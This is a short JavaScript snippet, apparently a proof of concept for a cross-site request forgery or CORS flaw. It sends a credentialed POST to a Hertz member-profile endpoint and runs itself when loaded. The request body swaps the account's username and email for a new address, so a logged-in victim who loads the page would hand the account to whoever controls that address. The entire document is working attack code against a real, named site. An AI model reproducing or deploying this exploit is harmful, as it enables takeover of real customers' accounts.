function sendReq(){
  var req = new XMLHttpRequest();
  req.onload = function() {
    alert(this.responseText);
  };
  req.open('POST', 'https://www.hertz.com/rentacar/rest/hertz/v2/member/modify/form/save', true);
  req.withCredentials = true;
  req.setRequestHeader('Content-Type', 'application/json');
  req.send(JSON.stringify({
   "mobilePhoneNumber":"636920056","mobileGoldBoardEmail":"Y","personalPhone":"","fromSummary":false,"useMyEmailCheckBox":true,"mobilePhoneCountryName":"Morocco","resendMobileGoldBoardTextMessage":false,"preferredPhone":"M","mobilePhonePrefix":"212","password":"********************************************","passwordVerify":"********************************************","mobileGoldBoardTextMessage":false,"userProgress":"","mobilePhoneCountryCode":"MA","emailVerify":"NEWFDFORME0202@EMAIL.COM","businessPhone":"","fax":"","countryMobileActive":false,"eReturn":true,"DOMmemberID":"18639022","email":"NEWFDFORME0202@EMAIL.COM","username":"NEWFDFORME0202@EMAIL.COM","processUUID":"0f31c8bf-765f-444a-97d9-f876c44ada92","modifiedVariables":"username||email||emailVerify||"
  }));
}
sendReq();
